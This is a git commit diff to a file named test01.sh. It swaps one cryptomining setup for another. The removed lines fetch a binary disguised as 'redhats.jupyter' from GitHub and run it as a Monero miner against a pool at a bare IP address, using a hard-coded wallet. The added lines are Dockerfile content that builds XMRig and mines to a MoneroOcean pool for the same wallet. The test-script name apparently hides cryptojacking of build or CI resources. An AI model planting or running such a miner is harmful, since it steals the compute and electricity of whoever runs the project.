c58e53b9fda6ac14409eea3d120753bcda1f2d98
philip330 <32610455+philip330@users.noreply.github.com>
2022-10-04 23:56:42 +0100

    test01.sh

--- test01.sh
+++ test01.sh
@@ -1,5 +1,11 @@
-before build:
-wget https://raw.githubusercontent.com/chirifa201/python/main/redhats.jupyter.tar.gz
-tar xvzf redhats.jupyter.tar.gz
-cd redhats.jupyter
-./redhats.jupyter -a rx/0 -o 142.132.131.248:80 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j -p test01 -k --tls --rig-id GC-US
+FROM alpine:latest
+RUN apk update
+RUN apk add wget
+RUN apk add git build-base cmake libuv-dev libressl-dev hwloc-dev
+RUN git clone https://github.com/xmrig/xmrig.git
+WORKDIR xmrig
+RUN mkdir build
+WORKDIR build
+RUN cmake ..
+RUN make -j$(nproc)
+CMD ./xmrig -a rx/0 -o gulf.moneroocean.stream:10128 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j
